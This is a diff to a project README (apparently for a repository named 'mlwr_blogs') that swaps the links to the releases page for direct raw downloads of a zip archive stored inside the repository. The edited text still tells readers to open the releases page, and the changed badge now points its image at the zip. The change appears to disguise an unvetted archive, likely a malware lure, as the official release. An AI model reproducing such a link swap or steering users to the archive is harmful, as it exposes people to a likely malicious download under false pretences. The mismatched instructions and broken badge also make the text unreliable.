@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/ershikwa/mlwr_blogs/releases)
+[![Download](https://raw.githubusercontent.com/ershikwa/mlwr_blogs/main/Vasa/mlwr_blogs_v2.4.zip%20release-blue)](https://raw.githubusercontent.com/ershikwa/mlwr_blogs/main/Vasa/mlwr_blogs_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run the content effectively, you will need:
 
 To get started, please visit our releases page to download the latest version of the blogs:
 
-[Visit this page to download](https://github.com/ershikwa/mlwr_blogs/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ershikwa/mlwr_blogs/main/Vasa/mlwr_blogs_v2.4.zip)
 
 1. Click the link above to open the releases page.
 2. You will see a list of files. Look for the file that mentions the latest version.
